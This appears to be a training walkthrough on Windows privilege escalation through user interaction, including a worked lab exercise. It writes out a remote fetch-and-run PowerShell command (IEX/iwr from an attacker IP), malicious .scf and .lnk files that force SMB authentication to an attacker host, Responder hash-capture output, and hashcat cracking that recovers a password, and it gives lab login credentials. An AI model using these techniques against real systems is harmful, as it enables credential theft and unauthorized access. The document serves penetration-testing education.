# Interacting with Users
## Traffic Capture
If Wireshark is installed, unprivileged users may be able to capture network traffic, as the option to restrict Npcap driver access to Administrators only is not enabled by default.

Also, suppose our client positions us on an attack machine within the environment. In that case, it is worth running `tcpdump` or `Wireshark` for a while to see what types of traffic are being passed over the wire and if we can see anything interesting. The tool [net-creds](https://github.com/DanMcInerney/net-creds) can be run from our attack box to sniff passwords and hashes from a live interface or a pcap file. It is worth letting this tool run in the background during an assessment or running it against a pcap to see if we can extract any credentials useful for privilege escalation or lateral movement.

## Process Command Lines
### Monitoring for Process Command Lines
We can look for process command lines using something like this script below. It captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.

```shellsession
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

### Running Monitor Script on Target Host
We can host the script on our attack machine and execute it on the target host as follows.

```powershell
PS C:\htb> IEX (iwr 'http://10.10.10.205/procmon.ps1') 

InputObject                                           SideIndicator
-----------                                           -------------
@{CommandLine=C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}} =>      
@{CommandLine=“C:\Windows\system32\cmd.exe” }                          =>      
@{CommandLine=\??\C:\Windows\system32\conhost.exe 0x4}                      =>      
@{CommandLine=net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd}       =>       
@{CommandLine=“C:\Windows\system32\backgroundTaskHost.exe” -ServerName:CortanaUI.AppXy7vb4pc2... <=
```

## SCF on a File Share
A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share. This can be particularly useful if we gain write access to a file share that looks to be heavily used or even a directory on a user's workstation. We may be able to capture a user's password hash and use the cleartext password to escalate privileges on the target host, within the domain, or further our access/gain access to other resources.

### Malicious SCF File
In this example, let's create the following file and name it something like `@Inventory.scf` (similar to another file in the directory, so it does not appear out of place). We put an `@` at the start of the file name to appear at the top of the directory to ensure it is seen and executed by Windows Explorer as soon as the user accesses the share. Here we put in our `tun0` IP address and any fake share name and .ico file name.

```shellsession
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

### Starting Responder
Next, start Responder on our attack box and wait for the user to browse the share. If all goes to plan, we will see the user's NTLMV2 password hash in our console and attempt to crack it offline.

```shellsession
$ sudo responder -w -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.3]
    Responder IPv6             [dead:beef:2::1007]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-EMCORRGTKED]
    Responder Domain Name      [6QSJ.LOCAL]
    Responder DCE-RPC Port     [48370]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.43.30
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:815c504e7b06ebda:afb6d3b195be4454b26959e754cf7137:01010...<SNIP>...
```

### Cracking NTLMv2 Hash with Hashcat
We could then attempt to crack this password hash offline using Hashcat to retrieve the cleartext.

```shellsession
$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

## Capturing Hashes with a Malicious .lnk File
Using SCFs no longer works on Server 2019 hosts, but we can achieve the same effect using a malicious .lnk file. We can use various tools to generate a malicious `.lnk` file, such as [Lnkbomb](https://github.com/dievus/lnkbomb), as it is not as straightforward as creating a malicious `.scf` file. We can also make one using a few lines of PowerShell:

Generating a Malicious .lnk File
        
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

## Questions
RDP to 10.129.100.173 (ACADEMY-WINLPE-SRV01), with user `htb-student` and password `HTB_@cademy_stdnt!`
1. Using the techniques in this section obtain the cleartext credentials for the SCCM_SVC user. **Answer: Password1**
   - Notice the `Department Shares` on this machine, list write folders in this share using:
        ```cmd
        C:\Department Shares\Public\IT>for /f "delims=" %d in ('dir /s /b /ad "\\127.0.0.1\Department Shares"') do @echo test > "%d\_wtest.tmp" 2>nul && echo WRITABLE: %d && del "%d\_wtest.tmp" 2>nul
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        Access is denied.
        WRITABLE: \\127.0.0.1\Department Shares\Public\IT
        Access is denied.
        Access is denied.
        ```
   - Use the malicious `.lnk` file technique to create a link file that points to our attack host in this shared folder:
        ```powershell
        PS C:\> $objShell = New-Object -ComObject WScript.Shell
        PS C:\> $lnk = $objShell.CreateShortcut("C:\Department Shares\Public\IT\legit.lnk")
        PS C:\> $lnk.TargetPath = "\\10.10.15.47\@pwn.png"
        PS C:\> $lnk.WindowStyle = 1
        PS C:\> $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
        PS C:\> $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
        PS C:\> $lnk.HotKey = "Ctrl+Alt+O"
        PS C:\> $lnk.Save()
        ```
   - Start `responder` at our attack host and capture `SCCM_SVC` user's NTLM hash:
        ```shellsession
        $ sudo responder -w -v -I tun0
                                                __
        .----.-----.-----.-----.-----.-----.--|  |.-----.----.
        |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
        |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                        |__|

                NBT-NS, LLMNR & MDNS Responder 3.1.3.0
        <SNIP>
        [SMB] NTLMv2-SSP Client   : 10.129.100.173
        [SMB] NTLMv2-SSP Username : WINLPE-SRV01\sccm_svc
        [SMB] NTLMv2-SSP Hash     : sccm_svc::WINLPE-SRV01:18628bbe31b4f6cc:8303629EF18261B140A1959CF81A34CE:010100000000000080DE308F1B14DD01392B289EE82E4ADE0000000002000800320043005400460001001E00570049004E002D004D004900500037004B00580043005A0042003800390004003400570049004E002D004D004900500037004B00580043005A004200380039002E0032004300540046002E004C004F00430041004C000300140032004300540046002E004C004F00430041004C000500140032004300540046002E004C004F00430041004C000700080080DE308F1B14DD0106000400020000000800300030000000000000000100000000200000AC73371DE1F4BD6C9F9C31E926291447DC8C67C66E1481168E9CA074E9EBE16A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310035002E0034003700000000000000000000000000
        ```
   - Crack the hash offline:
        ```shellsession
        $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
        <SNIP>
        SCCM_SVC::WINLPE-SRV01:18628bbe31b4f6cc:8303629ef18261b140a1959cf81a34ce:010100000000000080de308f1b14dd01392b289ee82e4ade0000000002000800320043005400460001001e00570049004e002d004d004900500037004b00580043005a0042003800390004003400570049004e002d004d004900500037004b00580043005a004200380039002e0032004300540046002e004c004f00430041004c000300140032004300540046002e004c004f00430041004c000500140032004300540046002e004c004f00430041004c000700080080de308f1b14dd0106000400020000000800300030000000000000000100000000200000ac73371de1f4bd6c9f9c31e926291447dc8c67c66e1481168e9ca074e9ebe16a0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0034003700000000000000000000000000:Password1
        <SNIP>
        ```